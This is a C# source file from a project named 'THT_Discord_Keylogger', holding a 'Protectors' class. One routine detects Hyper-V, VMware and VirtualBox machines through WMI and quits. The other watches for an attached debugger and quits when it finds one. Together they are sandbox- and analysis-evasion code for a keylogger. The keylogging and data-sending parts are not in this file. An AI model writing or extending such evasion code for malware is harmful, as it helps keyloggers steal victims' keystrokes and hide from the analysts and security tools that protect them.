using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

namespace THT_Discord_Keylogger
{
    class Protectors
    {
        public static void check_wm()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(0);
                        }
                    }
                }
            }
        }

        public static void run_check_debugger_thread()
        {
            Thread t = new Thread(new ThreadStart(() => {
                while (!Debugger.IsAttached)
                {
                    Thread.Sleep(100);
                }
                Environment.Exit(0);
            }));
            t.Start();
        }
    }
}
